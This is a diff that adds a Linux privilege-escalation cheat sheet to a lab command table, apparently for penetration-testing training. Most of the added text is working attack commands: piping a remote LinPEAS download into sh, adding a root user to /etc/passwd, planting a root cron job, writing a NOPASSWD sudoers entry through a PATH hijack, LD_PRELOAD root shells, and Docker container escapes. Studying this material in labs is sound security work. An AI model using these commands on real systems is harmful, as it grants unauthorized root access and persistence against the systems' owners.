@@ -1,3 +1,9 @@
+# Linux Privilege Escalation
+
+Comprehensive enumeration and exploitation paths. Always start with automated tools then manual.
+
+## Initial Enumeration
+
 | **Command** | **Description** |
 | --------------|-------------------|
 | `ssh htb-student@<target IP>` | SSH to lab target |
@@ -35,3 +41,71 @@
 | `sudo mount -t nfs 10.129.2.12:/tmp /mnt` | Mount an NFS share locally |
 | `tmux -S /shareds new -s debugsess` | Created a shared `tmux` session socket |
 | `./lynis audit system` | Perform a system audit with `Lynis` |
+
+## 2026 Automation + Newer Techniques
+
+**Recommended enumeration first:**
+```bash
+# LinPEAS (best all-rounder)
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# pspy (process snooping, no root needed)
+./pspy64 -pf -i 1000
+
+# Linux Exploit Suggester
+./linux-exploit-suggester-2.pl -k $(uname -r)
+```
+
+## More Enumeration & Exploitation Examples
+
+```bash
+# SUID binaries + GTFOBins
+find / -perm -4000 -type f 2>/dev/null | while read f; do echo "=== $f ==="; strings $f | head -5; done
+
+# Writable /etc/passwd (classic)
+echo 'hacker:$1$abc$def:0:0::/root:/bin/bash' >> /etc/passwd
+su hacker
+
+# Cron job abuse (writable script)
+ls -l /etc/cron.*
+cat /etc/cron.d/backup
+echo '* * * * * root /tmp/evil.sh' > /etc/cron.d/mine
+
+# PATH hijacking
+echo 'echo "hacker ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > /tmp/id
+chmod +x /tmp/id
+PATH=/tmp:$PATH sudo -l
+
+# LD_PRELOAD
+gcc -fPIC -shared -o /tmp/root.so /tmp/shell.c
+sudo LD_PRELOAD=/tmp/root.so /usr/sbin/service apache2 restart
+```
+
+### Container Escape Examples
+```bash
+# Privileged container
+docker run -it --privileged --pid=host alpine chroot /host bash
+
+# Docker socket
+docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt bash
+```
+
+**Recent example CVEs / classes (verify on target):**
+- Sudo chroot issues (CVE-2025-32463 / related 2025) — if sudoers allows -R.
+- Kernel netfilter / other LPE (CVE-2024-1086 and successors used heavily).
+- Container escapes (OverlayFS, runc, Kubernetes).
+- Polkit / pkexec remnants and new similar.
+- Always check `sudo -l`, capabilities (`getcap -r / 2>/dev/null`), writable /etc/cron*, LD_PRELOAD, PATH hijacks.
+
+**Container / Cloud specific:**
+- Docker socket mount abuse
+- Privileged containers
+- LXD / LXC breakout (still classic)
+
+**Tools 2026:**
+- LinPEAS + PEASS-ng suite
+- pspy
+- trivy / grype for container image vulns (if you have access)
+- Manual + GTFOBins (https://gtfobins.github.io/)
+
+References: HackTricks Linux PE checklist, PEASS-ng, GTFOBins, recent CVE feeds.
